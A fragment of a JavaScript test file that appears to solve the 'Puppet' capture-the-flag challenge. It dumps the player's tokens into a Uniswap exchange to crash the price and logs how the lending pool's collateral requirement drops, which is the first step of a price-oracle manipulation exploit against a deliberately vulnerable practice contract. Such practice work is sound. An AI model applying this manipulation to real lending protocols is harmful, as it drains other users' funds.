...
describe("[Challenge] Puppet", function () {
  ...
  it("Execution", async function () {
    ...
    collat = await lendingPool.calculateDepositRequired(
      POOL_INITIAL_TOKEN_BALANCE
    );

    console.log(collat, "heeh 1");
    await token.approve(uniswapExchange.address, PLAYER_INITIAL_TOKEN_BALANCE);
    const time = (await ethers.provider.getBlock("latest")).timestamp * 2;
    await uniswapExchange
      //   .connect(player)
      .tokenToEthSwapInput(PLAYER_INITIAL_TOKEN_BALANCE, 1, time);

    collat = await lendingPool.calculateDepositRequired(
      POOL_INITIAL_TOKEN_BALANCE
    );
    console.log(collat, "hehe 2");
  ...
  after(async function () {
    ...
    expect(await ethers.provider.getTransactionCount(player.address)).to.eq(0);
